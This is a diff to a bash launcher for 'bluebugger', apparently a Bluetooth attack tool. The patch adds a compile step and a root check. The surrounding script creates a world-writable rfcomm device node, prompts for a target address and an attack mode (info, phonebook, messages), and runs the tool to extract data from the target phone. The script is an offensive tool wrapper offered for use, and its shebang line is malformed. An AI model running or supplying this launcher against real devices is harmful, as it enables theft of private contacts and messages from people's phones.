@@ -1,4 +1,21 @@
 # bin/bash
+
+if [ ! -f "src/bluebugger" ]; then
+    echo -e "\033[0;32mCompiling bluebugger..."
+    make > /dev/null 2>&1
+    echo -e "\033[0;31mChecking for root user..."
+    sleep 0.3
+else
+    echo -e "\033[0;31mChecking for root user..."
+    sleep 0.3
+fi
+
+
+if [[ $(id -u) -ne 0 ]] ; then 
+   echo -e "\033[0;36mYou are Not Root! Please Run as root" ; exit 1 ; 
+fi
+
+
 mkdir -p /dev/bluetooth/rfcomm
 mknod -m 666 /dev/bluetooth/rfcomm/0 c 216 0
 clear
@@ -28,4 +45,4 @@ echo -e "${VERMILION}"
 read -p "SET ATTACK MODE(e.g info, phonebook, messages) ====>" MODE
 echo -e "${WHITE}"
 read -p "SET OUTPUT PATH ====>" P
-./bluebugger -a $ADDR $MODE -c 2 -o $P
+./src/bluebugger -a $ADDR $MODE -c 2 -o $P
